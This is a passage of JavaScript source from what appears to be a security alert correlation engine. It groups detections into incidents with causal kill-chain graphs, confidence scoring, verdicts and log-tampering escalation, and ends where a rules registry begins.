      // same bucket as opposite-OS detections. Linux detections stay in
      // Linux buckets; Windows detections stay in Windows buckets.
      // 'unknown' OS can group with either side.
      function _detectionOs(det) {
        // Try inferring OS from ruleId prefix
        const rid = det.ruleId || '';
        if (rid.startsWith('CSDE-WIN')) return 'windows';
        if (rid.startsWith('CSDE-LNX')) return 'linux';
        // Try from evidence event
        const ev = (det.raw_detections || [det])[0] || det;
        const os = ev._os || _detectOS(ev);
        if (os !== 'unknown') return os;
        // Try from category hints
        const cat = (det.category || det.mitre?.tactic || '').toLowerCase();
        if (/cron|sudo|syslog|auditd|ssh\s*brute/.test(cat)) return 'linux';
        return 'unknown';
      }

      // parent array for union-find
      const parent = dedupDets.map((_, i) => i);
      const find = i => { while (parent[i] !== i) { parent[i] = parent[parent[i]]; i = parent[i]; } return i; };
      const union = (a, b) => { parent[find(a)] = find(b); };

      // Pre-compute OS and timestamps for each detection
      const detMeta = dedupDets.map(det => ({
        os   : _detectionOs(det),
        tsMs : new Date(det.first_seen || det.timestamp || 0).getTime(),
        tactic: (det.mitre?.tactic || det.category || '').toLowerCase().replace(/\s+/g, '-'),
        host : (det.computer || det.host || '').toLowerCase(),
        user : (det.user || '').toLowerCase(),
      }));

      // Map each identity key → list of detection indices
      const keyToIdx = new Map();
      dedupDets.forEach((det, i) => {
        const { keys } = _detectionAdversaryKey(det);
        keys.forEach(k => {
          if (!keyToIdx.has(k)) keyToIdx.set(k, []);
          keyToIdx.get(k).push(i);
        });
      });

      // ── Union detections sharing identity key, within proximity window,
      //    and passing all context guards ─────────────────────────────────
      keyToIdx.forEach((idxList, key) => {
        if (idxList.length < 2) return;
        const sorted = idxList.slice().sort((a, b) => detMeta[a].tsMs - detMeta[b].tsMs);

        for (let i = 0; i < sorted.length - 1; i++) {
          const idxA = sorted[i], idxB = sorted[i + 1];
          const detA = dedupDets[idxA], detB = dedupDets[idxB];
          const mA   = detMeta[idxA],   mB   = detMeta[idxB];

          // ── Guard 1: Temporal proximity ───────────────────────────
          if (Math.abs(mB.tsMs - mA.tsMs) > CFG.ACE_PROXIMITY_WINDOW_MS) continue;

          // ── Guard 2: OS compatibility ─────────────────────────────
          // Windows-only + Linux-only detections MUST NOT be grouped together.
          // 'unknown' OS can group with either side.
          if (mA.os !== 'unknown' && mB.os !== 'unknown' && mA.os !== mB.os) continue;

          // ── Guard 3: Cross-user merging ────────────────────────────
          // Real (non-system) users from different accounts are ONLY merged
          // when the key is IP-based (same attacker pivoting accounts) OR
          // when one of the users is a system/service account.
          const userANorm = mA.user.includes('\\') ? mA.user.split('\\').pop() : mA.user;
          const userBNorm = mB.user.includes('\\') ? mB.user.split('\\').pop() : mB.user;
          const aIsSystem = !userANorm || userANorm.includes('$') ||
                            userANorm.includes('system') || userANorm.includes('nt authority') ||
                            userANorm.includes('network service') || userANorm.includes('local service');
          const bIsSystem = !userBNorm || userBNorm.includes('$') ||
                            userBNorm.includes('system') || userBNorm.includes('nt authority') ||
                            userBNorm.includes('network service') || userBNorm.includes('local service');
          const bothRealUsers = !aIsSystem && !bIsSystem;
          if (bothRealUsers && userANorm !== userBNorm) {
            // Only merge across users for IP-keyed relationships (same attacker, different target accounts)
            if (!key.startsWith('ip:')) continue;
          }

          // ── Guard 4: Same-host restriction for process/execution events ──
          // Execution, persistence, credential-access, and privilege-escalation
          // detections on different hosts CANNOT be directly grouped unless:
          //   • The key is IP-based (same attacker IP on both hosts), OR
          //   • The key is session-based, OR
          //   • The key is user-based (u:username) AND one side is lateral-movement,
          //     initial-access, or command-and-control (the bridge tactic), OR
          //   • Both detections are on the SAME user (same adversary pivoting)
          //     and the time gap is within the ACE proximity window (already checked).
          const localTactics = new Set(['execution','persistence','privilege-escalation','credential-access']);
          const bridgeTactics = new Set(['lateral-movement','initial-access','command-and-control']);
          const aIsLocal  = localTactics.has(mA.tactic);
          const bIsLocal  = localTactics.has(mB.tactic);
          const aIsBridge = bridgeTactics.has(mA.tactic);
          const bIsBridge = bridgeTactics.has(mB.tactic);
          if (aIsLocal && bIsLocal && mA.host && mB.host && mA.host !== mB.host) {
            // Different-host local-execution events cannot be directly grouped
            // UNLESS: ip-keyed, session-keyed, or user-keyed cross-host with same user
            const sameUser = mA.user && mB.user && mA.user === mB.user;
            if (!key.startsWith('ip:') && !key.startsWith('session:') && !sameUser) continue;
          }
          // Allow local-tactic → bridge-tactic cross-host merging (e.g., credential-access on
          // DC01 → lateral-movement on FILE-SERVER by same user is valid and expected)
          if ((aIsLocal && bIsBridge || aIsBridge && bIsLocal) &&
              mA.host && mB.host && mA.host !== mB.host) {
            const sameUser = mA.user && mB.user && mA.user === mB.user;
            if (!key.startsWith('ip:') && !key.startsWith('session:') && !sameUser) continue;
            // Valid cross-host pivot — proceed to union
          }

          union(idxA, idxB);
        }
      });

      // Collect buckets
      const buckets = new Map();
      dedupDets.forEach((det, i) => {
        const root = find(i);
        if (!buckets.has(root)) buckets.set(root, []);
        buckets.get(root).push(det);
      });
      return Array.from(buckets.values());
    }

    // ── Step 3: Build a causal DAG for a bucket ───────────────────
    // Nodes = detections, edges = valid causal transitions
    // Returns { nodes, edges, invalidEdges, isValid, phaseSequence,
    //           causalViolations, stageConfidence }
    //
    // FIXES (v8):
    //   • Strict forward-time only: gap MUST be >= 0 ms (no future→past edges)
    //   • Jitter tolerance: events within CFG.IDENTICAL_TS_JITTER ms treated as
    //     simultaneous and linked without strict ordering
    //   • Causal edge REQUIRES gap > 0 OR same-tactic (parallel activity)
    //   • Phase-sequence is built from actual node order (chronological), NOT
    //     re-sorted by phase-order — ensures effect never precedes cause
    //   • Causal violations recorded for analyst output
    //   • Per-node stage confidence computed from evidence quality + tactic rarity
    function _buildCausalDAG(bucket) {
      // ── 1. Sort strictly by first_seen ascending (canonical chain order) ──
      const nodes = [...bucket].sort((a, b) => {
        const ta = new Date(a.first_seen || a.timestamp || 0).getTime();
        const tb = new Date(b.first_seen || b.timestamp || 0).getTime();
        // Secondary sort: phase order for ties (earlier kill-chain phase wins)
        if (Math.abs(ta - tb) <= CFG.IDENTICAL_TS_JITTER) {
          const pa = PHASE_ORDER[(a.mitre?.tactic || a.category || '').toLowerCase().replace(/\s+/g,'-')] ?? 99;
          const pb = PHASE_ORDER[(b.mitre?.tactic || b.category || '').toLowerCase().replace(/\s+/g,'-')] ?? 99;
          return pa - pb;
        }
        return ta - tb;
      });

      const edges        = [];  // { from, to, edgeType, valid, gap_ms }
      const invalidEdges = [];  // { from, to, reason } — causal violations
      const causalViolations = []; // analyst-readable list

      // ── 2. Build directed edges (forward only) ──────────────────
      for (let i = 0; i < nodes.length; i++) {
        for (let j = i + 1; j < nodes.length; j++) {
          const from = nodes[i];
          const to   = nodes[j];
          const tacticFrom = (from.mitre?.tactic || from.category || '').toLowerCase().replace(/\s+/g,'-');
          const tacticTo   = (to.mitre?.tactic   || to.category   || '').toLowerCase().replace(/\s+/g,'-');
          const tsFrom = new Date(from.first_seen || from.timestamp || 0).getTime();
          const tsTo   = new Date(to.first_seen   || to.timestamp   || 0).getTime();
          const gap    = tsTo - tsFrom; // always >= 0 because nodes are sorted ascending

          // ── Enforce strict forward-time: skip if gap exceeds max causal window ──
          if (gap > CFG.ACE_CAUSAL_EDGE_MAX_GAP) continue;

          // ── Validate tactic causal order ──────────────────────────
          const validSuccessors = VALID_CAUSAL_EDGES[tacticFrom] || new Set();
          const samePhase = tacticFrom === tacticTo;
          // An edge is valid when:
          //   a) both tactics are the same (parallel/continuation), OR
          //   b) to-tactic is a valid successor of from-tactic, OR
          //   c) from-tactic has no causal map (unknown/generic) — allow but flag
          const isValidEdge = samePhase || validSuccessors.has(tacticTo) ||
                              (!tacticFrom) || (!tacticTo) ||
                              !VALID_CAUSAL_EDGES[tacticFrom]; // unknown origin — no map

          if (isValidEdge) {
            edges.push({ from: i, to: j, fromDet: from, toDet: to,
                         edgeType: `${tacticFrom}→${tacticTo}`, gap_ms: gap, valid: true });
          } else {
            // Record causal violation for analyst output
            const violation = {
              from: i, to: j,
              fromDet: from, toDet: to,
              reason: `Causal violation: ${tacticFrom} → ${tacticTo} is not a valid kill-chain progression`,
              gap_ms: gap,
            };
            invalidEdges.push(violation);
            causalViolations.push({
              stage_a: { index: i, tactic: tacticFrom, ruleId: from.ruleId, timestamp: from.first_seen || from.timestamp },
              stage_b: { index: j, tactic: tacticTo,   ruleId: to.ruleId,   timestamp: to.first_seen   || to.timestamp   },
              violation: violation.reason,
              gap_ms: gap,
            });
          }
        }
      }

      // ── 3. Build phase sequence in ACTUAL chronological order ────
      // Do NOT sort by phase-order index — that would put persistence before
      // execution if the rule fired later. Use the order of first appearance.
      const seenPhases    = new Set();
      const phaseSequence = [];
      nodes.forEach(n => {
        const tactic = (n.mitre?.tactic || n.category || 'unknown').toLowerCase().replace(/\s+/g,'-');
        if (!seenPhases.has(tactic)) {
          seenPhases.add(tactic);
          phaseSequence.push(tactic);
        }
      });

      // ── 4. Per-node stage confidence ─────────────────────────────
      // Factors: riskScore, evidence count, technique severity weight, edge count
      const outDegree = new Array(nodes.length).fill(0);
      const inDegree  = new Array(nodes.length).fill(0);
      edges.forEach(e => { outDegree[e.from]++; inDegree[e.to]++; });

      const stageConfidence = nodes.map((n, idx) => {
        if (n.inferred) return n.inferredConfidence || CFG.BCE_INFER_CONFIDENCE_BASE;
        const baseRisk     = n.riskScore || 0;
        const evCount      = (n.raw_detections || [n]).reduce((s, rd) => s + ((rd.evidence || []).length || 1), 0);
        const techWeight   = TECHNIQUE_SEV_WEIGHT[n.mitre?.technique || n.technique || ''] || 5;
        const linkBonus    = Math.min((outDegree[idx] + inDegree[idx]) * 5, 20);
        const rawConf      = (baseRisk * 0.5) + (Math.min(evCount, 10) * 2) + techWeight + linkBonus;
        return Math.min(Math.round(rawConf), 100);
      });

      return {
        nodes,
        edges,
        invalidEdges,
        causalViolations,
        phaseSequence,
        stageConfidence,
        isValid: nodes.length === 1 || edges.length > 0,
        isChronologicallyOrdered: true, // guaranteed by sort above
        crossHost: [...new Set(nodes.map(n => n.computer || n.host || ''))].filter(Boolean).length > 1,
        causallyClean: causalViolations.length === 0,
      };
    }

    // ── Step 4: Chain-merge algorithm ─────────────────────────────
    // Merges two buckets into one when:
    //   • same adversary identity (shared user+srcIP), OR same non-system user, OR same srcIP
    //   • gap ≤ ACE_MERGE_GAP_MS
    //   • same OS (windows buckets never merge with linux buckets)
    function _mergeFragmentedChains(buckets) {
      if (buckets.length < 2) return buckets;

      // Build bucket metadata
      const meta = buckets.map(b => {
        const sorted = [...b].sort((a,b) => {
          return new Date(a.first_seen||a.timestamp||0) - new Date(b.first_seen||b.timestamp||0);
        });
        const lastDet = sorted[sorted.length - 1];
        const firstDet= sorted[0];
        const lastTs  = new Date(lastDet.last_seen  || lastDet.first_seen  || lastDet.timestamp  || 0).getTime();
        const firstTs = new Date(firstDet.first_seen || firstDet.timestamp || 0).getTime();
        const keys = new Set();
        b.forEach(d => _detectionAdversaryKey(d).keys.forEach(k => keys.add(k)));
        const tactics = new Set(b.map(d => (d.mitre?.tactic||d.category||'').toLowerCase().replace(/\s+/g,'-')));

        // Extract non-system users and source IPs for cross-bucket identity matching
        const users = new Set();
        const srcIps = new Set();
        const osSet  = new Set();
        b.forEach(d => {
          const u = (d.user || '').toLowerCase().trim();
          const uNorm = u.includes('\\') ? u.split('\\').pop() : u;
          const isSystem = !uNorm || uNorm === 'system' || uNorm.includes('nt authority') ||
                           uNorm.endsWith('$') || uNorm.includes('network service') ||
                           uNorm.includes('local service');
          if (!isSystem && uNorm) users.add(uNorm);
          const ip = (d.srcIp || '').replace('::ffff:','').trim();
          if (ip && ip !== '-') srcIps.add(ip);
          // OS of bucket
          const rid = d.ruleId || '';
          if (rid.startsWith('CSDE-WIN')) osSet.add('windows');
          else if (rid.startsWith('CSDE-LNX')) osSet.add('linux');
        });
        const os = osSet.size === 1 ? [...osSet][0] : 'unknown';
        return { sorted, firstTs, lastTs, keys, tactics, users, srcIps, os };
      });

      const merged = new Array(buckets.length).fill(false);
      const result = [];

      for (let i = 0; i < buckets.length; i++) {
        if (merged[i]) continue;
        let combined = [...buckets[i]];
        for (let j = i + 1; j < buckets.length; j++) {
          if (merged[j]) continue;

          // ── OS compatibility: never merge Windows and Linux chains ──
          if (meta[i].os !== 'unknown' && meta[j].os !== 'unknown' && meta[i].os !== meta[j].os) continue;

          const gap = Math.abs(meta[j].firstTs - meta[i].lastTs);
          if (gap > CFG.ACE_MERGE_GAP_MS) continue;

          // ── Identity overlap: shared adversary key, same user, or same srcIP ──
          const sharedKey  = [...meta[i].keys].some(k => meta[j].keys.has(k));
          const sharedUser = [...meta[i].users].some(u => meta[j].users.has(u));
          const sharedIp   = [...meta[i].srcIps].some(ip => meta[j].srcIps.has(ip));
          if (!sharedKey && !sharedUser && !sharedIp) continue;

          // Merge if gap is within limit and identity overlaps
          combined = combined.concat(buckets[j]);
          merged[j] = true;
          // Update meta[i] for next iteration
          meta[i].lastTs = Math.max(meta[i].lastTs, meta[j].lastTs);
          meta[j].keys.forEach(k => meta[i].keys.add(k));
          meta[j].tactics.forEach(t => meta[i].tactics.add(t));
          meta[j].users.forEach(u => meta[i].users.add(u));
          meta[j].srcIps.forEach(ip => meta[i].srcIps.add(ip));
        }
        result.push(combined);
      }

      return result;
    }

    function _correlateIncidents(dedupDets) {
      if (!dedupDets.length) return { incidents: [], standaloneDetections: [] };

      // Sort by first_seen ascending
      const sorted = [...dedupDets].sort((a, b) => {
        const ta = new Date(a.first_seen || a.timestamp || 0).getTime();
        const tb = new Date(b.first_seen || b.timestamp || 0).getTime();
        return ta - tb;
      });

      // ── Step 1: Group into adversary buckets using union-find ─────
      const rawBuckets = _buildAdversaryBuckets(sorted);

      // ── Step 2: Merge fragmented chains ──────────────────────────
      const mergedBuckets = _mergeFragmentedChains(rawBuckets);

      // Filter out buckets that don't meet minimum size
      const validBuckets = mergedBuckets.filter(b => b.length >= CFG.ACE_MIN_NODES_FOR_GRAPH);

      const incidents    = [];
      const assignedIds  = new Set();

      // ── Step 3: Build incident from each valid bucket ─────────
      validBuckets.forEach(bucket => {
        if (!bucket.length) return;

        // ── FP Suppression: remove known-safe unless critical/high ─
        const qualifiedCluster = bucket.filter(d => {
          const sev = d.aggregated_severity || d.severity || 'low';
          if (sev === 'critical' || sev === 'high') return true;
          const evidenceEvent = (d.raw_detections || [d])[0];
          const fpCheck = evidenceEvent ? _checkFPSuppression(evidenceEvent, d.ruleId || '') : { suppressed: false };
          if (fpCheck.suppressed) { d._fpSuppressed = true; d._fpReason = fpCheck.reason; return false; }
          return true;
        });
        if (!qualifiedCluster.length) return;

        // ── BCE Step 1: Behavioral Fingerprinting ─────────────────
        // Apply tool/command pattern overrides for precise tactic classification
        qualifiedCluster.forEach(d => _applyBehavioralFingerprint(d));

        // ── BCE Step 2: Assign detection lifecycle roles ──────────
        qualifiedCluster.forEach(d => { d._role = _classifyDetectionRole(d); });

        // ── BCE Step 3: Enforce minimum chain depth (infer stages) ─
        // If only 1-2 observed stages for mid/late-stage tactics, infer precursors
        const depthEnforcedCluster = _enforceMinimumChainDepth(qualifiedCluster);
        const hasInferredStages    = depthEnforcedCluster.some(d => d.inferred);

        // ── Intent classification ─────────────────────────────────
        const intentSignals = depthEnforcedCluster.filter(d => !d.inferred).map(d => {
          const ev = (d.raw_detections || [d])[0] || {};
          return _classifyIntent(ev, d);
        });
        const attackerCount = intentSignals.filter(s => s.intent === 'attacker').length;
        const adminCount    = intentSignals.filter(s => s.intent === 'admin').length;
        // Suppress clearly admin-only low-risk buckets
        if (adminCount > 0 && attackerCount === 0 &&
            qualifiedCluster.every(d => (d.riskScore || 0) < 70)) {
          qualifiedCluster.forEach(d => { d._adminSuppressed = true; });
          return;
        }

        // ── Build Causal DAG (includes inferred stages) ───────────
        const dag = _buildCausalDAG(depthEnforcedCluster);

        // ── Parent = highest riskScore then severity (observed only) ─
        const sortedCluster = [...qualifiedCluster].sort((a, b) => {
          const rDiff = (b.riskScore || 0) - (a.riskScore || 0);
          if (rDiff !== 0) return rDiff;
          return (SEV_WEIGHT[b.aggregated_severity || b.severity] || 0)
               - (SEV_WEIGHT[a.aggregated_severity || a.severity] || 0);
        });
        const parent   = sortedCluster[0];
        const children = sortedCluster.slice(1);

        // ── Forensic timestamps — real First Seen / Last Seen ────
        let firstSeenMs = Infinity, lastSeenMs = -Infinity;
        // Use ONLY observed stages for timestamps (not inferred)
        qualifiedCluster.forEach(d => {
          const fs = new Date(d.first_seen || d.timestamp || 0).getTime();
          const ls = new Date(d.last_seen  || d.first_seen || d.timestamp || 0).getTime();
          if (fs > 0 && fs < firstSeenMs) firstSeenMs = fs;
          if (ls > 0 && ls > lastSeenMs)  lastSeenMs  = ls;
        });
        if (firstSeenMs === Infinity)  firstSeenMs = new Date(parent.first_seen || parent.timestamp || 0).getTime();
        if (lastSeenMs  === -Infinity) lastSeenMs  = new Date(parent.last_seen  || parent.timestamp || 0).getTime();
        if (lastSeenMs <= firstSeenMs && qualifiedCluster.length > 1) {
          lastSeenMs = firstSeenMs + qualifiedCluster.length * 500;
        }
        const incidentTs   = firstSeenMs > 0 ? new Date(firstSeenMs).toISOString() : (parent.first_seen || parent.timestamp);
        const incidentLast = lastSeenMs  > 0 ? new Date(lastSeenMs).toISOString()  : incidentTs;
        const durationMs   = Math.max(0, lastSeenMs - firstSeenMs);

        // ── Full MITRE aggregation per node (no dropping) ────────
        const allTactics    = [...new Set(qualifiedCluster.map(d => d.mitre?.tactic || d.category || '').filter(Boolean))];
        const allTechniques = [...new Set(qualifiedCluster.map(d => d.mitre?.technique || d.technique || '').filter(Boolean))];
        const allMitreMappings = qualifiedCluster.reduce((acc, d, idx) => {
          const t = d.mitre?.technique || d.technique || '';
          if (t && !acc.find(m => m.technique === t)) {
            acc.push({
              technique  : t,
              name       : d.mitre?.name || '',
              tactic     : d.mitre?.tactic || d.category || '',
              confidence : d.confidence_score || 30,
              role       : idx === 0 ? 'primary' : 'secondary',
              ruleId     : d.ruleId || '',
              ruleName   : d.detection_name || d.ruleName || '',
              host       : d.computer || d.host || '',
            });
          }
          return acc;
        }, []);

        // ── Cross-host pivot metadata ─────────────────────────────
        const allHosts  = [...new Set(qualifiedCluster.map(d => d.computer || d.host || '').filter(Boolean))];
        const allUsers  = [...new Set(qualifiedCluster.map(d => d.user || '').filter(Boolean))];
        const allSrcIps = [...new Set(qualifiedCluster.map(d => d.srcIp || '').filter(Boolean))];
        const crossHost = allHosts.length > 1;

        // ── Highest severity across chain ─────────────────────────
        const highestSev = qualifiedCluster.reduce((best, d) => {
          const w = SEV_WEIGHT[d.aggregated_severity || d.severity] || 0;
          return w > (SEV_WEIGHT[best] || 0) ? (d.aggregated_severity || d.severity) : best;
        }, 'low');

        // ── Multi-factor dynamic ACE scoring ──────────────────────
        const aceScore   = _computeACEScore(qualifiedCluster, dag, crossHost, intentSignals, parent);

        // ── Behavior classification ───────────────────────────────
        const behavior   = _classifyIncidentBehavior(qualifiedCluster);

        // ── Forensic confidence (blended with ACE score) ──────────
        const confidence = _computeForensicConfidence(qualifiedCluster, parent);
        confidence.score   = Math.max(confidence.score, aceScore.score);
        confidence.reasons = [...new Set([...confidence.reasons, ...aceScore.reasons])];
        if      (confidence.score >= 90) confidence.level = 'Confirmed';
        else if (confidence.score >= 70) confidence.level = 'Strongly Indicative';
        else if (confidence.score >= 40) confidence.level = 'Likely';
        else                             confidence.level = 'Possible';

        // ── Attack phase timeline (causal, chronological — includes inferred stages) ─
        // Use depthEnforcedCluster so inferred precursor stages are in the timeline
        const phaseTimeline = _buildPhaseTimeline(depthEnforcedCluster);

        const incId = 'INC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();

        qualifiedCluster.forEach(d => {
          d._incidentId = incId;
          d._isParent   = (d === parent);
          assignedIds.add(d.id);
        });

        const incidentTitle = behavior.behaviorTitle || parent.detection_name || parent.ruleName || 'Correlated Incident';

        const incObj = {
          id               : incId,          // canonical .id field expected by UI and API
          incidentId       : incId,
          title            : incidentTitle,
          parent,
          children,
          all              : qualifiedCluster,
          severity         : highestSev,
          riskScore        : aceScore.score,
          first_seen       : incidentTs,
          last_seen        : incidentLast,
          duration_ms      : durationMs,
          durationLabel    : _formatDuration(durationMs),
          host             : parent.computer || parent.host || '',
          user             : parent.user || '',
          allHosts,
          allUsers,
          allSrcIps,
          crossHost,
          mitreTactics     : allTactics,
          techniques       : allTechniques,
          mitreMappings    : allMitreMappings,
          detectionCount   : qualifiedCluster.length,
          childCount       : children.length,
          correlationBasis : crossHost ? 'adversary-centric-cross-host' : 'adversary-centric-single-host',
          behavior,
          confidence,
          phaseTimeline,
          dag              : {
            nodeCount    : dag.nodes.length,
            edgeCount    : dag.edges.length,
            phaseSequence: dag.phaseSequence,
            crossHost    : dag.crossHost,
            invalidEdges : dag.invalidEdges,
            causalViolations: dag.causalViolations || [],
            causallyClean: dag.causallyClean !== false,
            isChronologicallyOrdered: true,
            stageConfidence: dag.stageConfidence || [],
          },
          intentSignals : {
            attackerCount,
            adminCount,
            dominated: attackerCount > adminCount ? 'attacker' : adminCount > attackerCount ? 'admin' : 'ambiguous',
          },
          aceScore,
          // ── P1 Escalation: auto-escalate when log-tampering is detected ──
          // FIX v7: Any detection with p1Escalate=true forces the incident to
          // critical severity and adds a P1 escalation notice.
          p1Escalated: qualifiedCluster.some(d => {
            const rule = RULES.find(r => r.id === d.ruleId);
            return rule && rule.p1Escalate;
          }),
          logTamperingDetected: qualifiedCluster.some(d =>
            d.ruleId === 'CSDE-WIN-023' || d.ruleId === 'CSDE-WIN-024' || d.ruleId === 'CSDE-WIN-027'
          ),
          // ── SOC-Ready Verdict ────────────────────────────────────────────
          // Deterministic TRUE_POSITIVE / FALSE_POSITIVE / PARTIAL verdict
          // based on confidence score, behavior classification, and intent signals.
          verdict: (() => {
            if (qualifiedCluster.some(d => d.ruleId === 'CSDE-WIN-023' || d.ruleId === 'CSDE-WIN-024' ||
                d.ruleId === 'CSDE-WIN-027')) return 'TRUE_POSITIVE'; // log tampering = always TP
            if (confidence.score >= 70) return 'TRUE_POSITIVE';
            if (confidence.score >= 40 && attackerCount > 0) return 'TRUE_POSITIVE';
            if (adminCount > 0 && attackerCount === 0 && confidence.score < 50) return 'FALSE_POSITIVE';
            return 'PARTIAL'; // uncertain — needs analyst review
          })(),
          verdictReason: (() => {
            if (qualifiedCluster.some(d => d.ruleId === 'CSDE-WIN-023' || d.ruleId === 'CSDE-WIN-024' ||
                d.ruleId === 'CSDE-WIN-027')) return 'Log tampering detected — definitive attacker action';
            if (confidence.score >= 90) return `High confidence (${confidence.score}/100): ${confidence.reasons[0]||''}`;
            if (confidence.score >= 70) return `Strongly indicative (${confidence.score}/100): ${confidence.reasons[0]||''}`;
            if (adminCount > 0 && attackerCount === 0) return `Admin-intent signals dominant (admin:${adminCount}, attacker:${attackerCount})`;
            return `Confidence ${confidence.score}/100 — analyst review recommended`;
          })(),
        };
        incObj.narrative = _generateForensicNarrative(incObj, behavior, confidence);

        // ── P1 Auto-Escalation ────────────────────────────────────────────
        // FIX v7: Force critical severity and 100 risk for log-tampering incidents.
        // Log-clearing and audit-policy changes are definitive attacker actions.
        if (incObj.p1Escalated || incObj.logTamperingDetected) {
          incObj.severity    = 'critical';
          incObj.riskScore   = 100;
          incObj.p1Priority  = true;
          incObj.p1Reason    = 'Log-tampering or security-service-stop detected — automatic P1 escalation';
          // Prepend P1 notice to narrative
          incObj.narrative = `⚠️ P1 AUTO-ESCALATION: ${incObj.p1Reason}.\n\n` + incObj.narrative;
          incObj.verdict       = 'TRUE_POSITIVE';
          incObj.verdictReason = 'Log tampering is a definitive attacker action — no false-positive scenario';
        }

        incidents.push(incObj);
      });

      incidents.sort((a, b) => (b.riskScore || 0) - (a.riskScore || 0));

      const standaloneDetections = dedupDets.filter(d => !assignedIds.has(d.id));
      return { incidents, standaloneDetections };
    }


    // ── OS detection helpers ─────────────────────────────────────
    // Returns 'windows' | 'linux' | 'unknown' for a single event
    // FIX v7: Hardened OS detection — sysmon EIDs 1-30 are Windows,
    // high EIDs (4608+) are Windows, explicit linux keywords take priority.
    // WSL detected separately (bash.exe on Windows = windows OS).
    function _detectOS(e) {
      if (e._os) return e._os;
      const eid = parseInt(e.EventID, 10);

      // ── Explicit Linux log-source keywords (highest priority) ──────
      const src = (e.source || e.log_source || e.logsource || e.Channel || '').toLowerCase();
      const msg  = (e.message || e.msg || e.raw || '').toLowerCase();
      if (src.includes('syslog') || src.includes('auth.log') || src.includes('auditd') ||
          src.includes('kern.log') || src.includes('secure')) return 'linux';
      // Linux message keywords — only if no conflicting Windows fields present
      const hasWindowsFields = !!(e.EventID || e.Computer || e.SubjectUserName ||
                                  e.TargetUserName || e.CommandLine || e.NewProcessName ||
                                  e.Image || e.ParentImage);
      if (!hasWindowsFields) {
        if (msg.includes('pam_unix') || msg.includes('sshd') ||
            (msg.includes('sudo') && msg.includes('tty=')) ||
            msg.includes('audit(')) return 'linux';
      }

      // ── Sysmon: EventIDs 1–30 WITH Sysmon-specific fields ─────────
      if (!isNaN(eid) && eid >= 1 && eid <= 30) {
        if (e.Image || e.ParentImage || e.TargetFilename || e.DestinationIp ||
            e.SourceIp || e.PipeName || src.includes('sysmon')) return 'windows';
      }

      // ── Windows Security / System EventIDs (always Windows) ───────
      if (!isNaN(eid) && (
          (eid >= 1100 && eid <= 1110) ||   // Security audit
          (eid >= 4608 && eid <= 4799) ||   // Security logon/account
          (eid >= 4900 && eid <= 4999) ||   // Security policy
          (eid >= 5000 && eid <= 5200) ||   // Security network
          (eid >= 6005 && eid <= 6009) ||   // System startup/shutdown
          (eid >= 7000 && eid <= 7099) ||   // Service Control Manager
          eid === 4697 || eid === 7045       // Service install
      )) return 'windows';

      // ── PowerShell EventIDs ────────────────────────────────────────
      if (!isNaN(eid) && eid >= 4100 && eid <= 4106) return 'windows';

      // ── Windows field hints (strong evidence) ─────────────────────
      if (e.Computer || e.SubjectUserName || e.TargetUserName ||
          e.CommandLine || e.NewProcessName || e.Image || e.ParentImage) return 'windows';

      return 'unknown';
    }

    // ── Rule variant normalizer ──────────────────────────────────
    // Strips "[Variant N]", "[v2]", "(Variant 3)" etc. from rule titles/IDs
    function _normalizeRuleName(name) {
      return String(name || '')
        .replace(/\s*[\[(]Variant\s*\d+[\])]?\s*/gi, '')
        .replace(/\s*\[v\d+\]\s*/gi, '')
        .replace(/\s{2,}/g, ' ')
        .trim();
    }

    // ── Base rule ID extraction ──────────────────────────────────
    // CSDE-WIN-002-CORP\admin  →  CSDE-WIN-002
    // CSDE-WIN-001-WP          →  CSDE-WIN-001
    // CSDE-WIN-003             →  CSDE-WIN-003
    // CSDE-LNX-001             →  CSDE-LNX-001
    // backend-det-7            →  (use ruleName slug instead)
    function _baseRuleId(ruleId) {
      if (!ruleId) return 'UNKNOWN';
      const s = String(ruleId);
      // Match standard CSDE rule IDs: PREFIX-OS-NNN (3 dash groups)
      const m = s.match(/^(CSDE-[A-Z]+-\d+[A-Z]*)/);
      if (m) return m[1];
      // Strip event-index suffix from per-event variant IDs (e.g. CSDE-WIN-004-NET-7)
      const m2 = s.match(/^([A-Z]+-[A-Z]+-\d+[A-Z]?)/);
      if (m2) return m2[1];
      // Backend/external rule IDs: return as-is (they'll be grouped by canonical slug)
      return s;
    }

    // ── Canonical rule slug for cross-engine deduplication ───────
    // Normalizes a detection's identity for bucketing, supporting both
    // CSDE rule IDs and backend/external rule title slugs.
    function _canonicalSlug(det) {
      // Prefer canonical ruleId if it looks like a CSDE rule
      const rid = det.ruleId || '';
      if (rid.match(/^CSDE-/)) return _baseRuleId(rid);
      // Fallback: slug from detection name / title / ruleName
      const name = _normalizeRuleName(det.detection_name || det.ruleName || det.title || rid || '');
      if (name) {
        return 'SLUG-' + name.toLowerCase()
          .replace(/[^a-z0-9]+/g, '-')
          .replace(/^-+|-+$/g, '')
          .slice(0, 40);
      }
      return 'UNKNOWN';
    }

    // ── Wildcard/glob match (O(1) for non-wildcard) ───────────────
    function _wildMatch(pattern, value) {
      if (!pattern || value === undefined || value === null) return false;
      const str = String(value).toLowerCase();
      const pat = String(pattern).toLowerCase();
      if (!pat.includes('*') && !pat.includes('?')) return str.includes(pat);
      const rx = '^' + pat.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$';
      try { return new RegExp(rx).test(str); } catch { return false; }
    }

    // ── Normalize a raw event to standard field names ─────────────
    // This is the canonical normalize — called once per event, O(1)
    function _normalizeEvent(raw) {
      const e = Object.assign({}, raw);
      e.EventID     = parseInt(e.EventID ?? e.eventId ?? e.event_id, 10) || e.EventID;
      e.commandLine = e.commandLine || e.CommandLine || e.cmdLine || e.ProcessCmdLine || '';
      e.process     = e.process     || e.NewProcessName || e.ProcessName || e.Image || e.exe || '';
      e.parentProcess = e.parentProcess || e.ParentProcessName || e.ParentProcess || e.ParentImage || '';
      e.user        = e.user        || e.User || e.SubjectUserName || e.TargetUserName || e.username || '';
      e.computer    = e.computer    || e.Computer || e.ComputerName || e.hostname || e.host || '';
      e.srcIp       = e.srcIp       || e.SourceIP || e.SourceIPAddress || e.src_ip || e.IpAddress || '';
      e.destIp      = e.destIp      || e.DestinationIp || e.DestinationAddress || e.dest_ip || '';
      e.destPort    = e.destPort    || e.DestinationPort || e.dest_port || '';
      e.timestamp   = e.timestamp   || e.TimeGenerated || e.TimeCreated || e.time || e.date || new Date().toISOString();
      e._os         = _detectOS(e);
      return e;
    }

    // ════════════════════════════════════════════════════════════════
    //  RULES REGISTRY
    //  Each rule carries:
    //    id          — canonical rule ID (no variant suffix)
